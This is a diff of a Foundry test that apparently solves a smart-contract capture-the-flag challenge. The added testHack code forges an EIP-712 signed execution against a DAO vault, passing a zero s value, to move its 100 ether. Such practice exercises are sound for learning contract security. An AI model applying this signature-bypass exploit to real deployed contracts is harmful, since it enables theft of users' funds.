@@ -10,9 +10,6 @@ import {DaoVaultImplementation, FactoryDao, IDaoVault} from "../src/7_crystalDAO
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
-
-
-
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
 ////////////////////////////////////////////////////////////*/
@@ -34,10 +31,29 @@ contract Challenge7Test is Test {
 
         // The vault has reached 100 ether in donations
         deal(address(vault), 100 ether);
+
+        // console.log("----", vault.owner());
     }
 
-
     function testHack() public {
+        bytes32 digest = keccak256(
+            abi.encode(
+                keccak256("Exec(address target,uint256 value,bytes memory execOrder,uint256 nonce,uint256 deadline)"),
+                daoManager,
+                100 ether,
+                "",
+                0,
+                type(uint256).max
+            )
+        );
+
+        bytes32 finalMessage = keccak256(abi.encodePacked("\x19\x01", vault.getDomainSeparator(), digest));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(daoManagerKey, finalMessage);
+
+        // vm.expectRevert(bytes("Only owner can execute!"));
+        vault.execWithSignature(v, r, 0, daoManager, 100 ether, "", type(uint256).max);
+
         vm.startPrank(whitehat, whitehat);
         /*////////////////////////////////////////////////////
         //               Add your hack below!               //
@@ -45,9 +61,6 @@ contract Challenge7Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge7Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-
-
 
         //==================================================//
         vm.stopPrank();
